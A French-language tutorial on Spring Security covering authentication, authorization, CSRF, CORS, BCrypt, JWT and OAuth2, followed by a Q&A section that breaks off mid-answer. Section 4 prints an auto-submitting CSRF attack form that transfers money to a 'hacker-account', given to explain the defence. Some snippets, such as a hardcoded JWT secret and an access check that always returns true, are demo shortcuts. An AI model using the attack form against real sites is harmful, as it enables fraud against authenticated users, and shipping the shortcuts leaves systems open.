## [**..**](./00_index.md)

## **Spring Security - Authentication & Authorization**
---

### **1. Concepts Fondamentaux de Spring Security**

**Authentication vs Authorization :**
- **Authentication** : "Qui êtes-vous ?" - Vérification de l'identité de l'utilisateur (login/password, token, etc.)
- **Authorization** : "Que pouvez-vous faire ?" - Vérification des permissions et rôles de l'utilisateur

**Architecture Spring Security :**
Spring Security fonctionne avec une chaîne de **Security Filters** qui interceptent chaque requête HTTP. Les principaux composants sont :
- **SecurityFilterChain** : Configure la chaîne de filtres de sécurité
- **AuthenticationManager** : Gère le processus d'authentification
- **UserDetailsService** : Charge les informations utilisateur depuis la source de données
- **PasswordEncoder** : Encode/vérifie les mots de passe

---

### **2. Configuration par Défaut de Spring Security**

**Comportement par défaut :**
Dès l'ajout de la dépendance Spring Security, toutes les routes sont automatiquement protégées :
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

Spring Security génère automatiquement :
- Une page de login (`/login`)
- Un utilisateur par défaut : `user`
- Un mot de passe aléatoire affiché dans les logs console
- Protection CSRF activée
- Headers de sécurité (X-Frame-Options, X-XSS-Protection)

---

### **3. Form Authentication vs Basic Authentication**

#### **Form Authentication**
Authentification via formulaire HTML, idéale pour les applications web traditionnelles.

**Caractéristiques :**
- Page de login personnalisable
- Session cookie pour maintenir l'authentification
- Redirection après login
- Remember-me functionality

**Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .formLogin(form -> form
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard")
                .permitAll()
            );
        
        return http.build();
    }
}
```

#### **Basic Authentication**
Authentification via HTTP header `Authorization: Basic base64(username:password)`

**Caractéristiques :**
- Pas de session, stateless par nature
- Credentials envoyés à chaque requête
- Adapté pour REST APIs
- **Doit être utilisé avec HTTPS** car credentials en base64 (facilement décodable)

**Configuration :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .anyRequest().authenticated()
        )
        .httpBasic(Customizer.withDefaults())
        .csrf(csrf -> csrf.disable()); // Pour REST API
    
    return http.build();
}
```

**Exemple de requête :**
```bash
curl -u username:password http://localhost:8080/api/users
# Ou avec header
curl -H "Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=" http://localhost:8080/api/users
```

---

### **4. CSRF (Cross-Site Request Forgery)**

**Qu'est-ce que CSRF ?**
CSRF est une attaque où un site malveillant trompe un utilisateur authentifié pour qu'il effectue une action non désirée sur un site de confiance.

**Exemple d'attaque :**
1. L'utilisateur se connecte à `bank.com` (session active)
2. Il visite `malicious.com` qui contient un formulaire caché :
```html
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="hacker-account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```
3. Sans protection CSRF, la requête est exécutée avec les credentials de l'utilisateur

**Protection CSRF dans Spring Security :**
Spring Security génère un **CSRF token** unique par session qui doit être inclus dans toutes les requêtes mutantes (POST, PUT, DELETE).

**Configuration pour application web (CSRF activé) :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(Customizer.withDefaults()) // Activé par défaut
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
    
    return http.build();
}
```

**Dans le formulaire HTML :**
```html
<form method="POST" action="/api/users">
    <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
    <!-- Ou avec Thymeleaf -->
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
</form>
```

**Configuration pour REST API (CSRF désactivé) :**
Pour les REST APIs **stateless** (JWT, Basic Auth), CSRF n'est pas nécessaire car il n'y a pas de session cookies :
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable()) // Désactiver pour REST API
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .httpBasic(Customizer.withDefaults());
    
    return http.build();
}
```

**Règle :** 
- ✅ CSRF activé : applications web avec sessions
- ❌ CSRF désactivé : REST APIs stateless (JWT, Basic Auth sans session)

---

### **5. CORS (Cross-Origin Resource Sharing)**

**Problème :**
Par défaut, les navigateurs bloquent les requêtes AJAX vers un domaine différent (politique Same-Origin).

**Exemple :**
- Frontend sur `http://localhost:3000` (React)
- Backend sur `http://localhost:8080` (Spring Boot)
- ❌ Requête bloquée par CORS

**Configuration CORS dans Spring Security :**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList("http://localhost:3000"));
        configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(Arrays.asList("*"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**Ou avec annotation @CrossOrigin :**
```java
@RestController
@CrossOrigin(origins = "http://localhost:3000")
public class UserController {
    @GetMapping("/api/users")
    public List<User> getUsers() { ... }
}
```

---

### **6. Storing User Credentials**

#### **In-Memory (pour dev/test uniquement)**
```java
@Bean
public UserDetailsService userDetailsService() {
    UserDetails user = User.builder()
        .username("john")
        .password(passwordEncoder().encode("password123"))
        .roles("USER")
        .build();
    
    UserDetails admin = User.builder()
        .username("admin")
        .password(passwordEncoder().encode("admin123"))
        .roles("ADMIN")
        .build();
    
    return new InMemoryUserDetailsManager(user, admin);
}
```

#### **JDBC (Base de données)**
**Configuration :**
```java
@Configuration
public class SecurityConfig {
    
    @Autowired
    private DataSource dataSource;
    
    @Bean
    public UserDetailsService userDetailsService() {
        JdbcUserDetailsManager manager = new JdbcUserDetailsManager(dataSource);
        
        // Spring Security utilise ces tables par défaut
        // users(username, password, enabled)
        // authorities(username, authority)
        
        return manager;
    }
}
```

**Schema SQL (tables standard Spring Security) :**
```sql
CREATE TABLE users (
    username VARCHAR(50) PRIMARY KEY,
    password VARCHAR(100) NOT NULL,
    enabled BOOLEAN NOT NULL
);

CREATE TABLE authorities (
    username VARCHAR(50) NOT NULL,
    authority VARCHAR(50) NOT NULL,
    FOREIGN KEY (username) REFERENCES users(username)
);
```

#### **Custom UserDetailsService (recommandé en production)**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPassword())
            .roles(user.getRoles().toArray(new String[0]))
            .build();
    }
}
```

---

### **7. Encoding vs Hashing vs Encryption**

**Différences critiques :**

| Concept | Réversible ? | Usage | Exemple |
|---------|-------------|-------|---------|
| **Encoding** | ✅ Oui (décodable) | Représentation de données | Base64, URL encoding |
| **Hashing** | ❌ Non (one-way) | Stockage passwords | BCrypt, SHA-256 |
| **Encryption** | ✅ Oui (avec clé) | Protection données sensibles | AES, RSA |

**Encoding (Base64) :**
```java
String original = "password123";
String encoded = Base64.getEncoder().encodeToString(original.getBytes());
// cGFzc3dvcmQxMjM=
String decoded = new String(Base64.getDecoder().decode(encoded));
// password123 ⚠️ Facilement réversible !
```

**Hashing (BCrypt) - RECOMMANDÉ pour passwords :**
```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(); // Strength 10 par défaut
}

// Utilisation
String rawPassword = "password123";
String hashedPassword = passwordEncoder.encode(rawPassword);
// $2a$10$XYZ... (60 caractères, inclut salt)

boolean matches = passwordEncoder.matches("password123", hashedPassword);
// true
```

**Pourquoi BCrypt ?**
- ✅ **Salt automatique** : chaque hash est unique même pour le même password
- ✅ **Configurable strength** : ralentit les attaques brute-force
- ✅ **One-way** : impossible de retrouver le password original
- ✅ **Résistant aux rainbow tables**

**Configuration avec BCrypt :**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12); // Strength 12 (plus sécurisé, plus lent)
    }
    
    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.builder()
            .username("john")
            .password(passwordEncoder().encode("password123"))
            .roles("USER")
            .build();
        
        return new InMemoryUserDetailsManager(user);
    }
}
```

**Encryption (AES) - pour données sensibles non-passwords :**
```java
// Pour données qui doivent être déchiffrées plus tard (numéros carte, etc.)
// ⚠️ Ne JAMAIS utiliser pour passwords !
```

---

### **8. JWT (JSON Web Token) Authentication**

**Qu'est-ce que JWT ?**
JWT est un standard pour créer des **tokens d'accès sécurisés et autosuffisants** pour les REST APIs stateless.

**Structure JWT :**
```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIn0.xyz123
```

**Composants :**
1. **Header** : Type de token et algorithme de signature
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

2. **Payload** : Claims (données utilisateur)
```json
{
  "sub": "john",
  "roles": ["USER"],
  "iat": 1516239022,
  "exp": 1516242622
}
```

3. **Signature** : Garantit l'intégrité
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**Flow JWT Authentication :**
```
1. Client → POST /auth/login {username, password}
2. Server → Validate credentials
3. Server → Generate JWT token
4. Server → Response {token: "eyJhbGc..."}
5. Client → Store token (localStorage, sessionStorage)
6. Client → GET /api/users + Header: Authorization: Bearer eyJhbGc...
7. Server → Validate JWT signature & expiration
8. Server → Extract user info from token
9. Server → Response {users: [...]}
```

**Implémentation JWT avec Spring Security :**

**Dépendances :**
```xml
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.11.5</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>
```

**JwtUtil - Service pour gérer JWT :**
```java
@Component
public class JwtUtil {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.expiration}")
    private Long expiration; // 86400000 = 24h
    
    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
    
    public String generateToken(String username) {
        Map<String, Object> claims = new HashMap<>();
        return Jwts.builder()
            .setClaims(claims)
            .setSubject(username)
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey(), SignatureAlgorithm.HS256)
            .compact();
    }
    
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }
    
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }
    
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }
    
    private Claims extractAllClaims(String token) {
        return Jwts.parserBuilder()
            .setSigningKey(getSigningKey())
            .build()
            .parseClaimsJws(token)
            .getBody();
    }
    
    public Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }
    
    public Boolean validateToken(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
    }
}
```

**JwtAuthenticationFilter - Filtre pour valider JWT :**
```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain filterChain) 
            throws ServletException, IOException {
        
        final String authHeader = request.getHeader("Authorization");
        
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }
        
        try {
            final String jwt = authHeader.substring(7);
            final String username = jwtUtil.extractUsername(jwt);
            
            if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                
                if (jwtUtil.validateToken(jwt, userDetails)) {
                    UsernamePasswordAuthenticationToken authToken = 
                        new UsernamePasswordAuthenticationToken(
                            userDetails,
                            null,
                            userDetails.getAuthorities()
                        );
                    
                    authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                    SecurityContextHolder.getContext().setAuthentication(authToken);
                }
            }
        } catch (Exception e) {
            logger.error("Cannot set user authentication: {}", e.getMessage());
        }
        
        filterChain.doFilter(request, response);
    }
}
```

**Security Configuration avec JWT :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Autowired
    private JwtAuthenticationFilter jwtAuthFilter;
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**", "/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration config) 
            throws Exception {
        return config.getAuthenticationManager();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

**Authentication Controller :**
```java
@RestController
@RequestMapping("/auth")
public class AuthController {
    
    @Autowired
    private AuthenticationManager authenticationManager;
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        try {
            authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );
        } catch (BadCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                .body(new ErrorResponse("Invalid credentials"));
        }
        
        final UserDetails userDetails = userDetailsService.loadUserByUsername(request.getUsername());
        final String jwt = jwtUtil.generateToken(userDetails.getUsername());
        
        return ResponseEntity.ok(new AuthResponse(jwt));
    }
}

@Data
class LoginRequest {
    private String username;
    private String password;
}

@Data
@AllArgsConstructor
class AuthResponse {
    private String token;
}
```

**Exemple d'utilisation côté client :**
```javascript
// Login
fetch('http://localhost:8080/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'john', password: 'password123' })
})
.then(res => res.json())
.then(data => {
  localStorage.setItem('token', data.token); // Stocker le token
});

// Requête protégée
fetch('http://localhost:8080/api/users', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
})
.then(res => res.json())
.then(users => console.log(users));
```

**Configuration application.properties :**
```properties
# JWT Configuration
jwt.secret=mySecretKeyForJwtTokenGenerationMustBe256BitsLongForHS256Algorithm
jwt.expiration=86400000
```

**⚠️ Sécurité JWT :**
- Secret key doit être complexe (256+ bits pour HS256)
- Utiliser HTTPS en production
- Expiration raisonnable (15min - 24h)
- Refresh tokens pour prolonger session
- Stocker token côté client de façon sécurisée (pas de localStorage si XSS risk)

---

### **9. Authorization - Method-Level Security**

**Annotations disponibles :**

#### **@EnableMethodSecurity (Spring Boot 3+)**
Active la sécurité au niveau méthode :
```java
@Configuration
@EnableMethodSecurity(
    prePostEnabled = true,      // Active @PreAuthorize, @PostAuthorize
    securedEnabled = true,       // Active @Secured
    jsr250Enabled = true         // Active @RolesAllowed
)
public class SecurityConfig { }
```

#### **@PreAuthorize - Vérification AVANT exécution**
```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    @GetMapping
    @PreAuthorize("hasRole('USER')")
    public List<User> getAllUsers() {
        return userService.findAll();
    }
    
    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
    
    // Expressions SpEL complexes
    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public User updateUser(@PathVariable Long id, @RequestBody User user) {
        return userService.update(id, user);
    }
    
    @GetMapping("/{id}")
    @PreAuthorize("@userSecurity.canAccessUser(#id)")
    public User getUser(@PathVariable Long id) {
        return userService.findById(id);
    }
}

// Custom security expression
@Component("userSecurity")
public class UserSecurity {
    public boolean canAccessUser(Long userId) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        // Custom logic
        return true;
    }
}
```

#### **@PostAuthorize - Vérification APRÈS exécution**
```java
@GetMapping("/{id}")
@PostAuthorize("returnObject.username == authentication.principal.username")
public User getUser(@PathVariable Long id) {
    return userService.findById(id);
}
```

#### **@Secured - Spring-specific**
```java
@DeleteMapping("/{id}")
@Secured("ROLE_ADMIN") // Nécessite préfixe "ROLE_"
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}

@GetMapping
@Secured({"ROLE_USER", "ROLE_ADMIN"}) // OR logic
public List<User> getUsers() {
    return userService.findAll();
}
```

#### **@RolesAllowed - Java EE standard**
```java
@DeleteMapping("/{id}")
@RolesAllowed("ADMIN") // Pas de préfixe "ROLE_"
public void deleteUser(@PathVariable Long id) {
    userService.delete(id);
}

@GetMapping
@RolesAllowed({"USER", "ADMIN"})
public List<User> getUsers() {
    return userService.findAll();
}
```

**Comparaison :**

| Annotation | Standard | Préfixe ROLE_ | SpEL Support | Recommandation |
|-----------|----------|---------------|--------------|----------------|
| **@PreAuthorize** | Spring | Non nécessaire | ✅ Oui (puissant) | **⭐ Recommandé** |
| **@PostAuthorize** | Spring | Non nécessaire | ✅ Oui | Cas spécifiques |
| **@Secured** | Spring | ✅ Obligatoire | ❌ Non | Legacy |
| **@RolesAllowed** | Java EE | ❌ Non | ❌ Non | Portabilité Java EE |

**Ma recommandation : @PreAuthorize** pour sa flexibilité avec SpEL.

---

### **10. OAuth2 - Login with Google**

**Qu'est-ce que OAuth2 ?**
OAuth2 est un protocole d'autorisation permettant à une application d'accéder aux ressources d'un utilisateur sans exposer ses credentials. Permet le **"Login with Google/Facebook/GitHub"**.

**Flow OAuth2 (Authorization Code) :**
```
1. User → Click "Login with Google"
2. App → Redirect to Google Authorization Server
3. User → Login on Google + Accept permissions
4. Google → Redirect to App with authorization code
5. App → Exchange code for access token (backend)
6. Google → Return access token
7. App → Use token to fetch user info
8. App → Create session/JWT for user
```

**Configuration Spring Boot + OAuth2 :**

**Dépendances :**
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

**application.properties :**
```properties
# Google OAuth2
spring.security.oauth2.client.registration.google.client-id=YOUR_CLIENT_ID
spring.security.oauth2.client.registration.google.client-secret=YOUR_CLIENT_SECRET
spring.security.oauth2.client.registration.google.scope=profile,email
spring.security.oauth2.client.registration.google.redirect-uri={baseUrl}/login/oauth2/code/{registrationId}

# GitHub OAuth2 (optionnel)
spring.security.oauth2.client.registration.github.client-id=YOUR_GITHUB_CLIENT_ID
spring.security.oauth2.client.registration.github.client-secret=YOUR_GITHUB_CLIENT_SECRET
```

**Security Configuration :**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard", true)
                .failureUrl("/login?error=true")
            );
        
        return http.build();
    }
}
```

**Controller :**
```java
@Controller
public class HomeController {
    
    @GetMapping("/")
    public String home() {
        return "home";
    }
    
    @GetMapping("/dashboard")
    public String dashboard(Model model, @AuthenticationPrincipal OAuth2User principal) {
        if (principal != null) {
            model.addAttribute("name", principal.getAttribute("name"));
            model.addAttribute("email", principal.getAttribute("email"));
            model.addAttribute("picture", principal.getAttribute("picture"));
        }
        return "dashboard";
    }
}
```

**Login Page (Thymeleaf) :**
```html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<body>
    <h1>Login</h1>
    <a href="/oauth2/authorization/google">
        <button>Login with Google</button>
    </a>
    <a href="/oauth2/authorization/github">
        <button>Login with GitHub</button>
    </a>
</body>
</html>
```

**Obtenir Client ID/Secret sur Google :**
1. Aller sur [Google Cloud Console](https://console.cloud.google.com/)
2. Créer un projet
3. APIs & Services → Credentials
4. Create OAuth 2.0 Client ID
5. Authorized redirect URIs : `http://localhost:8080/login/oauth2/code/google`

**Custom OAuth2 User Service (pour sauvegarder user en DB) :**
```java
@Service
public class CustomOAuth2UserService extends DefaultOAuth2UserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public OAuth2User loadUser(OAuth2UserRequest userRequest) throws OAuth2AuthenticationException {
        OAuth2User oAuth2User = super.loadUser(userRequest);
        
        String email = oAuth2User.getAttribute("email");
        String name = oAuth2User.getAttribute("name");
        
        // Sauvegarder ou mettre à jour user en DB
        User user = userRepository.findByEmail(email)
            .orElse(new User());
        user.setEmail(email);
        user.setName(name);
        user.setProvider("GOOGLE");
        userRepository.save(user);
        
        return oAuth2User;
    }
}
```

---

**Synthèse des concepts maîtrisés :**

✅ **Authentication** : Form, Basic, JWT, OAuth2  
✅ **Authorization** : Method-level security (@PreAuthorize, @Secured, @RolesAllowed)  
✅ **CSRF & CORS** : Protection et configuration  
✅ **User Storage** : In-memory, JDBC, Custom UserDetailsService  
✅ **Password Security** : BCrypt hashing  
✅ **JWT** : Génération, validation, stateless authentication  
✅ **OAuth2** : Login with Google/GitHub  


---

## **Questions/Réponses : Spring Security**

### **Questions Générales sur Spring Security**

**Q1 : Qu'est-ce que Spring Security et pourquoi l'utiliser ?**

**R :** Spring Security est un framework puissant et hautement personnalisable pour gérer l'**authentication** (qui êtes-vous ?) et l'**authorization** (que pouvez-vous faire ?) dans les applications Spring.

**Fonctionnalités principales :**
- Protection contre les attaques courantes (CSRF, session fixation, clickjacking)
- Support de multiples stratégies d'authentification (Form, Basic, JWT, OAuth2, LDAP)
- Authorization fine-grained au niveau méthode et URL
- Intégration transparente avec Spring Boot
- Protection des APIs REST

**Sans Spring Security :** je devrais implémenter manuellement toute la logique de sécurité, gérer les sessions, encoder les passwords, etc. C'est complexe et risqué.

---

**Q2 : Quelle est la différence entre Authentication et Authorization ?**

**R :** 

**Authentication (Authentification) :**
- **Question :** "Qui êtes-vous ?"
- **Processus :** Vérifier l'identité de l'utilisateur
- **Mécanismes :** Username/password, JWT token, OAuth2, biométrie
- **Exemple :** User se connecte avec `john/password123`

**Authorization (Autorisation) :**
- **Question :** "Que pouvez-vous faire ?"
- **Processus :** Vérifier les permissions/rôles après authentication
- **Mécanismes :** Roles (ADMIN, USER), Permissions (READ, WRITE)
- **Exemple :** User `john` avec role `USER` ne peut pas accéder à `/admin/**`

**Flow :**
```
1. Authentication → Vérifier credentials → Créer Authentication object
2. Authorization → Vérifier roles/permissions → Autoriser ou refuser l'accès
```

---

**Q3 : Comment fonctionne l'architecture de Spring Security ?**

**R :** Spring Security utilise une **chaîne de Security Filters** (Filter Chain) qui interceptent chaque requête HTTP.

**Composants principaux :**

```
HTTP Request
    ↓
[DelegatingFilterProxy]
    ↓
[SecurityFilterChain] → Chaîne de filtres
    ├── SecurityContextPersistenceFilter
    ├── LogoutFilter
    ├── UsernamePasswordAuthenticationFilter (Form login)
    ├── BasicAuthenticationFilter (Basic Auth)
    ├── JwtAuthenticationFilter (Custom JWT)
    ├── ExceptionTranslationFilter
    └── FilterSecurityInterceptor (Authorization)
    ↓
[AuthenticationManager] → Gère l'authentication
    ↓
[AuthenticationProvider] → Valide credentials
    ↓
[UserDetailsService] → Charge user depuis DB/memory
    ↓
[PasswordEncoder] → Vérifie password
    ↓
Controller
```

**Exemple de flow :**
1. User envoie `POST /login` avec username/password
2. `UsernamePasswordAuthenticationFilter` intercepte
3. `AuthenticationManager` délègue à `AuthenticationProvider`
4. `UserDetailsService` charge le user depuis la DB
5. `PasswordEncoder` compare les passwords
6. Si OK → `Authentication` object créé et stocké dans `SecurityContext`
7. Si KO → Exception lancée

---

**Q4 : Qu'est-ce que le SecurityContext et SecurityContextHolder ?**

**R :** 

**SecurityContext :**
- Contient les informations d'authentication de l'utilisateur actuel
- Contient l'objet `Authentication` (principal, credentials, authorities)

**SecurityContextHolder :**
- Holder statique qui stocke le `SecurityContext`
- Par défaut utilise `ThreadLocal` (un context par thread)

**Utilisation :**
```java
// Récupérer l'utilisateur authentifié
Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
String username = authentication.getName();
Collection<? extends GrantedAuthority> authorities = authentication.getAuthorities();

// Dans un controller
@GetMapping("/me")
public String getCurrentUser() {
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    return auth.getName(); // Username
}

// Ou avec injection
@GetMapping("/me")
public String getCurrentUser(@AuthenticationPrincipal UserDetails userDetails) {
    return userDetails.getUsername();
}
```

---

### **Questions sur la Configuration par Défaut**

**Q5 : Que se passe-t-il quand on ajoute Spring Security sans configuration ?**

**R :** Spring Boot active automatiquement une **configuration par défaut** :

**Comportement :**
- ✅ Toutes les routes sont protégées (nécessitent authentication)
- ✅ Génère un user par défaut : `user`
- ✅ Password aléatoire affiché dans les logs console :
```
Using generated security password: 8e557245-73e2-4286-969a-ff57fe326336
```
- ✅ Active une page de login `/login`
- ✅ CSRF protection activée
- ✅ Session-based authentication
- ✅ Headers de sécurité (X-Frame-Options, X-XSS-Protection)

**Pour tester :**
```bash
curl -u user:8e557245-73e2-4286-969a-ff57fe326336 http://localhost:8080/api/users
```

---

**Q6 : Comment désactiver la sécurité pour certains endpoints ?**

**R :** J'utilise `requestMatchers().permitAll()` dans la configuration :

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**", "/auth/**").permitAll()
                .requestMatchers("/h2-console/**").permitAll() // H2 database
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll() // Swagger
                .requestMatchers("/actuator/health").permitAll() // Health check
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

**Note :** L'ordre est important ! Les règles sont évaluées de haut en bas.

---

### **Questions sur Form Authentication**

**Q7 : Comment fonctionne Form Authentication dans Spring Security ?**

**R :** Form Authentication est l'authentification via un formulaire HTML classique.

**Flow :**
```
1. User accède à une ressource protégée → Redirigé vers /login
2. User remplit le formulaire (username/password)
3. POST /login → UsernamePasswordAuthenticationFilter intercepte
4. AuthenticationManager valide les credentials
5. Si OK → Créer session cookie + Rediriger vers page demandée
6. Si KO → Rediriger vers /login?error=true
```

**Configuration :**
```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/public/**").permitAll()
            .anyRequest().authenticated()
        )
        .formLogin(form -> form
            .loginPage("/login")              // Custom login page
            .loginProcessingUrl("/perform_login") // URL du POST
            .defaultSuccessUrl("/dashboard", true) // Après login réussi
            .failureUrl("/login?error=true")  // Après échec
            .usernameParameter("email")       // Nom du champ (défaut: username)
            .passwordParameter("pwd")         // Nom du champ (défaut: password)
            .permitAll()
        )
        .logout(logout -> logout
            .logoutUrl("/logout")
            .logoutSuccessUrl("/login?logout=true")
            .invalidateHttpSession(true)
            .deleteCookies("JSESSIONID")
            .permitAll()
        );
    
    return http.build();
}
```

**Formulaire HTML (Thymeleaf) :**
```html
<form method="POST" th:action="@{/perform_login}">
    <input type="text" name="email" placeholder="Email" required>
    <input type="password" name="pwd" placeholder="Password" required>
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}"/>
    <button type="submit">Login</button>
</form>
<div th:if="${param.error}">
    Invalid credentials
</div>
```

---

**Q8 : Quelle est la différence entre Form Authentication et Basic Authentication ?**

**R :** 

| Aspect | Form Authentication | Basic Authentication |
|--------|---------------------|---------------------|
| **Interface** | Formulaire HTML | Header HTTP |
| **State** | Stateful (session) | Stateless (no session) |
| **Usage** | Applications web | REST APIs |
| **Security** | Session cookie | Credentials à chaque requête |
| **User Experience** | Meilleure (page customisable) | Popup browser basique |
| **HTTPS** | Recommandé | **Obligatoire** |

**Form Authentication :** Pour les applications web avec interface utilisateur.

**Basic Authentication :** Pour les APIs REST, microservices, scripts.

---

### **Questions sur Basic Authentication**

**Q9 : Comment fonctionne Basic Authentication ?**

**R :** Basic Authentication envoie les credentials encodés en Base64 dans le header HTTP `Authorization`.

**Format :**
```
Authorization: Basic base64(username:password)
```

**Exemple :**
```bash
# Credentials: john:password123
# Base64: am9objpwYXNzd29yZDEyMw==

